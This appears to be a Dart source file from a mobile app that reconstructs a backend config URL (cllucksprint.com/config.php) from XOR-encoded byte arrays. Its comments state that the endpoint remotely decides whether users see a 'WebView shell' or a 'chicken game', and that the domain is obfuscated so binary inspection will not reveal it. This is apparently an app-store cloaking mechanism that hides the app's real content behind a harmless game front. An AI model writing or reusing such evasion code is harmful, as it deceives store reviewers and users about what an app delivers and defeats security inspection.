import '../cipher/byte_cipher.dart';

// ============================================================
//  Backend endpoint resolution
// ============================================================
//  The config endpoint is the single backend hop that decides
//  whether the user receives the WebView shell or the chicken
//  game. Its host is XOR-wrapped so a plain `strings` over the
//  binary will not surface the domain.
//
//  After re-keying byte_cipher.dart, regenerate these arrays
//  with `dart run tool/wrap_secrets.dart`.
// ============================================================

/// Returns the fully assembled backend endpoint URL.
/// Plaintext: https://cllucksprint.com/config.php
String resolveBackendEndpoint() {
  const host = <int>[
    0xd0, 0xac, 0x6f, 0x1d, 0xf6, 0x45, 0x9b, 0xc5,
    0x54, 0xbd, 0x88, 0xfa, 0xac, 0xb7, 0x1e, 0x40,
    0xa0, 0xec, 0x3d, 0x2a, 0xad, 0x55, 0x2d, 0x13,
  ];

  const path = <int>[
    0x97, 0xbb, 0x74, 0x03, 0xe3, 0x16, 0xd3, 0xc4,
    0x47, 0xb9, 0x94,
  ];

  if (host.isEmpty || path.isEmpty) return '';
  return unwrap(host) + unwrap(path);
}
